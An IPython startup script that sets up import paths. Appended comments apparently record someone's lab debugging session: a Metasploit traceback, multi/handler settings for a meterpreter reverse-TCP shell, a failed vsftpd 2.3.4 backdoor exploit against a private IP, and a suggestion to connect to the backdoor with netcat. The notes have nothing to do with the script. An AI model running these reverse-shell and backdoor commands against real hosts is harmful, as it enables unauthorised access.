import sys
from pathlib import Path
from ipython_startup import get_ipython

REPO_ROOT = Path(__file__).resolve().parent
repo_root_str = str(REPO_ROOT)
if repo_root_str not in sys.path:
    sys.path.insert(0, repo_root_str)

from bootstrap import build_namespace

shell = get_ipython()
if shell is None:
    raise RuntimeError("ipython_startup.py must be loaded by IPython.")

shell.push(build_namespace())


#WAIT DOES THIS MEAN IT WLRKIE???

    #   from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4757:in `readline_internal_charloop'
    #   from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4853:in `readline_internal'
    #   from /usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4875:in `readline'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/input/readline.rb:99:in `pgets'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:341:in `get_input_line'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:142:in `block in run'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context'
    #   from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
    # it CONNECTED and *then* failed
#     use exploit/multi/handler
# set PAYLOAD linux/x64/meterpreter/reverse_tcp  # (or your target's payload)
# set LHOST 10.0.0.193
# set LPORT 6200
# exploit and it errored so now we have

# msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
# [*] Started reverse TCP handler on 0.0.0.0:4444 
# [*] 10.0.0.22:6200 - Running automatic check ("set AutoCheck false" to disable)
# [-] 10.0.0.22:6200 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.0.0.22:6200).
# [*] Exploit completed, but no session was created.
# msf exploit(unix/ftp/vsftpd_234_backdoor) >  so its just netcat we need to debug then. the back door is spawned. i just don't know how it works. maybe we can use netcat to connect to the backdoor and see if it works? we can try `nc 4444` and see if we get a shell. if that works, then the issue is with the Metasploit handler. if it doesn't work, then the issue is with the backdoor itself.